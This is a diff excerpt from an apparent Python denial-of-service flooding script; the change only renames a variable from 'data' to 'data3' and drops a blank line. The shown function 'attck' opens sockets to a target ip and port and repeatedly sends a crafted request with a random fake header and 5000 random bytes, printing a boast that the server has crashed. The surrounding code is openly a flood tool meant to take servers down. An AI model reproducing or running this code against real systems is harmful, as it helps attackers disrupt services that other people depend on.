@@ -879,7 +879,7 @@ def start():
             print('[+] server error')
 def attck():
   global userip,socks5
-  data = random._urandom(5000)
+  data3 = random._urandom(5000)
   xx = int(0)
   anjgall = "Anjing: "+random.choice(userip)+random.choice(socks5)+"\r\n"
   content = "Content-Type: application/x-www-form-urlencoded\r\n"
@@ -890,16 +890,15 @@ def attck():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((str(ip),int(port)))
             s.send(str.encode(main_req))
-            s.send(str.encode(data))
+            s.send(str.encode(data3))
             for i in range(pack):
                 s.send(str.encode(main_req))
-                s.send(str.encode(data)) 
+                s.send(str.encode(data3))
             xx += random.randint(0, int(pack))
             print("SÉRVÉR {1} CRÂSH BY ZÁN")
         except:
             s.close()
             print('[+] server error')
-
 
 for variable in range(th):
   if variable == 'anjgkau':
